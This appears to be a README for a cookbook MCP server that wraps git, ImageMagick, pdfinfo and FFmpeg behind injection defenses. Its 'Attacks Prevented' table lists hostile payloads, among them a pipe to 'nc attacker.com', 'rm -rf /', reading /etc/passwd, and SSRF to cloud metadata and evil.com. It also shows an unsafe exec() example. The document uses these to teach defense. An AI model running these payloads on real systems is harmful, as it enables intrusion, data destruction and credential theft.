# CLI Wrapper MCP Server

A secure MCP server demonstrating safe wrapping of command-line tools with comprehensive command injection prevention.

## Overview

This cookbook demonstrates how to safely wrap CLI tools using the MCP Security Framework. It showcases:

- **Layer 2**: Command injection detection (pipes, backticks, `$()`, etc.)
- **Layer 4**: Per-tool timeout enforcement
- **Layer 4**: Rate limiting for expensive operations
- **Layer 5**: Command and argument allowlist validation
- **App Level**: Path validation and working directory restrictions

## Security Features Demonstrated

| Feature | Layer | Description |
|---------|-------|-------------|
| Command Injection Prevention | L2, App | Blocks `;`, `|`, `&&`, `$()`, backticks |
| Subcommand Allowlist | App | Only specified subcommands allowed |
| Argument Sanitization | App | Dangerous patterns rejected |
| Path Traversal Prevention | App | Working directories validated |
| Timeout Enforcement | L4 | Commands killed after timeout |
| Rate Limiting | L4 | Per-tool quotas for expensive operations |
| SSRF Prevention | App | URLs blocked in image/video tools |
| No Shell Execution | App | spawn() with shell: false |

## Installation

```bash
cd cookbook/cli-wrapper-server
npm install
npm run build
```

### Prerequisites

The following CLI tools should be installed for full functionality:

```bash
# Git (usually pre-installed)
git --version

# ImageMagick for image-resize
sudo apt install imagemagick  # Debian/Ubuntu
brew install imagemagick      # macOS

# Poppler for pdf-metadata
sudo apt install poppler-utils  # Debian/Ubuntu
brew install poppler            # macOS

# FFmpeg for encode-video
sudo apt install ffmpeg  # Debian/Ubuntu
brew install ffmpeg      # macOS
```

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `VERBOSE_LOGGING` | `false` | Enable debug logging |
| `GIT_TIMEOUT` | `10000` | Git command timeout (ms) |
| `IMAGE_TIMEOUT` | `30000` | ImageMagick timeout (ms) |
| `PDF_TIMEOUT` | `10000` | pdfinfo timeout (ms) |
| `VIDEO_TIMEOUT` | `300000` | FFmpeg timeout (ms, 5 min) |

### Basic Configuration

```typescript
const server = new SecureMcpServer({
  name: 'cli-wrapper-server',
  version: '1.0.0',
}, {
  defaultPolicy: {
    allowNetwork: false,
    allowWrites: true,  // CLI tools may create output files
  },
});
```

### Advanced Configuration

```typescript
const server = new SecureMcpServer({
  name: 'cli-wrapper-server',
  version: '1.0.0',
}, {
  toolRegistry: [
    {
      name: 'git-status',
      sideEffects: 'read',
      maxEgressBytes: 100 * 1024,  // 100KB for git output
      quotaPerMinute: 60,
    },
    {
      name: 'image-resize',
      sideEffects: 'write',
      quotaPerMinute: 20,
    },
    {
      name: 'encode-video',
      sideEffects: 'write',
      quotaPerMinute: 5,  // Expensive operation
      quotaPerHour: 50,
    },
  ],
});
```

## Tools Reference

### git-status

Execute safe git commands on a repository.

**Parameters:**
- `repoPath` (string, required): Path to the git repository
- `subcommand` (enum, optional): status | branch | log | diff | show (default: status)
- `args` (array, optional): Additional arguments (max 10)

**Allowed Subcommands:** `status`, `branch`, `log`, `diff`, `show`, `rev-parse`

**Example:**
```json
{
  "repoPath": "/home/user/my-project",
  "subcommand": "status"
}
```

**Response:**
```json
{
  "success": true,
  "subcommand": "status",
  "repoPath": "/home/user/my-project",
  "output": "On branch main\nnothing to commit, working tree clean",
  "exitCode": 0,
  "durationMs": 45
}
```

### image-resize

Resize images using ImageMagick.

**Parameters:**
- `inputPath` (string, required): Path to input image
- `outputPath` (string, required): Path for output image
- `width` (number, required): Target width (1-10000)
- `height` (number, required): Target height (1-10000)
- `quality` (number, optional): Output quality 1-100 (default: 85)
- `maintainAspect` (boolean, optional): Maintain aspect ratio (default: true)

**Allowed Extensions:** `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp`, `.bmp`, `.tiff`

**Example:**
```json
{
  "inputPath": "/home/user/photos/original.jpg",
  "outputPath": "/home/user/photos/thumbnail.jpg",
  "width": 800,
  "height": 600,
  "quality": 85
}
```

**Response:**
```json
{
  "success": true,
  "inputPath": "/home/user/photos/original.jpg",
  "outputPath": "/home/user/photos/thumbnail.jpg",
  "dimensions": { "width": 800, "height": 600, "maintainAspect": true },
  "quality": 85,
  "durationMs": 234
}
```

### pdf-metadata

Extract metadata from PDF files.

**Parameters:**
- `pdfPath` (string, required): Path to PDF file

**Example:**
```json
{
  "pdfPath": "/home/user/documents/report.pdf"
}
```

**Response:**
```json
{
  "success": true,
  "pdfPath": "/home/user/documents/report.pdf",
  "metadata": {
    "title": "Annual Report 2024",
    "author": "John Smith",
    "pages": 42,
    "pageSize": "595 x 842 pts (A4)",
    "pdfVersion": "1.7",
    "encrypted": false
  },
  "durationMs": 89
}
```

### encode-video

Encode videos using FFmpeg with safe presets.

**Parameters:**
- `inputPath` (string, required): Path to input video
- `outputPath` (string, required): Path for output video
- `format` (enum, optional): mp4 | webm | mkv | mov (default: mp4)
- `codec` (enum, optional): libx264 | libx265 | libvpx | copy (default: libx264)
- `preset` (enum, optional): ultrafast | superfast | ... | veryslow (default: medium)
- `crf` (number, optional): Quality 0-51, lower is better (default: 23)
- `maxDuration` (number, optional): Max duration in seconds
- `resolution` (string, optional): Output resolution (e.g., "1920x1080")

**Example:**
```json
{
  "inputPath": "/home/user/videos/raw.mp4",
  "outputPath": "/home/user/videos/compressed.mp4",
  "codec": "libx264",
  "preset": "fast",
  "crf": 23
}
```

**Response:**
```json
{
  "success": true,
  "inputPath": "/home/user/videos/raw.mp4",
  "outputPath": "/home/user/videos/compressed.mp4",
  "settings": {
    "format": "mp4",
    "codec": "libx264",
    "preset": "fast",
    "crf": 23
  },
  "durationMs": 15234
}
```

## Security Analysis

### Attacks Prevented

| Attack | Payload Example | Prevention |
|--------|-----------------|------------|
| Pipe Injection | `\| nc attacker.com` | Blocked by allowlist |
| Command Substitution | `$(whoami)` | Blocked by allowlist |
| Backtick Injection | `` `id` `` | Blocked by allowlist |
| Semicolon Injection | `; rm -rf /` | Blocked by allowlist |
| AND/OR Injection | `&& cat /etc/passwd` | Blocked by allowlist |
| Redirect Injection | `> /etc/passwd` | Blocked by allowlist |
| Path Traversal | `../../../etc/passwd` | Path validation |
| SSRF via ImageMagick | `http://169.254.169.254` | URL blocked in allowlist |
| SSRF via FFmpeg | `https://evil.com/video` | URL blocked in allowlist |
| ImageMagick MSL | `msl:script.msl` | MSL pattern blocked |
| FFmpeg concat | `concat:/etc/passwd` | concat pattern blocked |
| Unauthorized Command | `rm -rf /` | Command not in allowlist |

### Safe vs Unsafe Code

This server demonstrates the **safe** approach to CLI execution:

```typescript
// UNSAFE - Shell Injection Vulnerable (NEVER DO THIS)
import { exec } from 'child_process';
exec(`git status ${userInput}`);  // Shell interprets special characters!

// SAFE - No Shell, Direct argv (What this server uses)
import { spawn } from 'child_process';
spawn('git', ['status', userInput], { shell: false });
// Arguments passed directly to process, not interpreted by shell
```

### Defense in Depth

The CLI wrapper implements multiple layers of protection:

1. **Layer 2 Detection**: Framework detects common injection patterns
2. **No Shell Execution**: `spawn()` with `shell: false` prevents shell interpretation
3. **Command Allowlist**: Only pre-approved commands can execute
4. **Subcommand Allowlist**: Git limited to safe read-only subcommands
5. **Argument Validation**: Regex patterns block dangerous arguments
6. **Path Validation**: Working directories and file paths validated
7. **Timeout Enforcement**: Long-running commands killed
8. **SSRF Prevention**: URLs blocked in image/video tools

## Testing

```bash
# Run all tests
npm test

# Watch mode
npm run test:watch
```

### Test Coverage

The test suite covers:
- 20+ command injection payloads
- Git subcommand allowlist enforcement
- ImageMagick dangerous pattern blocking
- FFmpeg SSRF prevention
- Path traversal attempts
- File extension validation
- Combined attack patterns

## Claude Desktop Integration

Add to your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json` on macOS, `~/.config/Claude/claude_desktop_config.json` on Linux):

```json
{
  "mcpServers": {
    "cli-wrapper": {
      "command": "node",
      "args": ["dist/index.js"],
      "cwd": "/path/to/cookbook/cli-wrapper-server",
      "env": {
        "VERBOSE_LOGGING": "false"
      }
    }
  }
}
```

## Common Issues

### "Command not found" errors

Ensure the CLI tools are installed and in PATH:
```bash
which git convert pdfinfo ffmpeg
```

### Path validation failures

Ensure your files are within the allowed directories. By default:
- Current working directory
- `/home`
- `/Users`
- `/tmp`

### Timeout exceeded

Increase timeout via environment variables:
```bash
VIDEO_TIMEOUT=600000  # 10 minutes for video encoding
```

### "Subcommand not allowed"

Only safe, read-only git subcommands are allowed:
- `status`, `branch`, `log`, `diff`, `show`

Commands like `push`, `pull`, `reset` are intentionally blocked.

## License

MIT - Part of the MCP Security Framework cookbook examples.
